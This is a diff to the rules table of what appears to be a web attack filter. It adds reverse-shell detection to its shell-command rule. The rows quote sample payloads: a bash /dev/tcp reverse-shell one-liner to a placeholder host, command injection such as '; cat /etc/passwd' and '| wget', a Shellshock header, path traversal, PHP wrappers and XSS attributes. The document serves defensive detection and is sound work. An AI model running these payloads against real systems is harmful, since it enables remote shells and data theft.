@@ -75,7 +75,7 @@ The shipped rules:
 | `ATK-XSS-URL` | cross-site scripting: a parameter that is a javascript: address |
 | `ATK-XSS-ATTR` | cross-site scripting through attributes without `on…`: `<button formaction=…>` (sends the form elsewhere), `<a xlink:href=…>` in SVG -- only inside a tag (`<` and a letter, up to its `>`); the words alone and `x < y formaction=1` pass. Like `ATK-XSS-EVENT` it reads past an `&`: after decoding, a `%26` inside a tag is no different from a separator, so `a<b&formaction=1` is refused too; a `>` inside a quoted value does not end the tag here either (as for `ATK-XSS-EVENT`: the plain expression first, then one that follows quoted values up to the next `<`) |
 | `ATK-PHP` | PHP code in the address: &lt;?php, eval(base64_decode(...)) |
-| `ATK-SHELL` | shell commands in the address: ; cat /etc/passwd, \| wget http://…, $(id) |
+| `ATK-SHELL` | shell commands in the address: ; cat /etc/passwd, \| wget http://…, $(id) -- and a reverse shell's `/dev/tcp/<host>/<port>` (`bash -i >& /dev/tcp/203.0.113.5/4444 0>&1`); `/dev/tcp` without host and port passes |
 | `ATK-SHELLSHOCK` | Shellshock (CVE-2014-6271 and the ones after it): a header whose value starts with `() {` (also written `(){`) -- what a CGI script's bash runs (`User-Agent: () { :; }; /bin/bash -c id`), the Content-Type too; `() {` inside a value passes (a search for `function () { return x };`), cookies are not looked at |
 | `ATK-LFI` | reading the server's files: ../../, /etc/passwd |
 | `ATK-WRAPPER` | PHP stream wrappers in the address: php://filter, phar://, data:// |
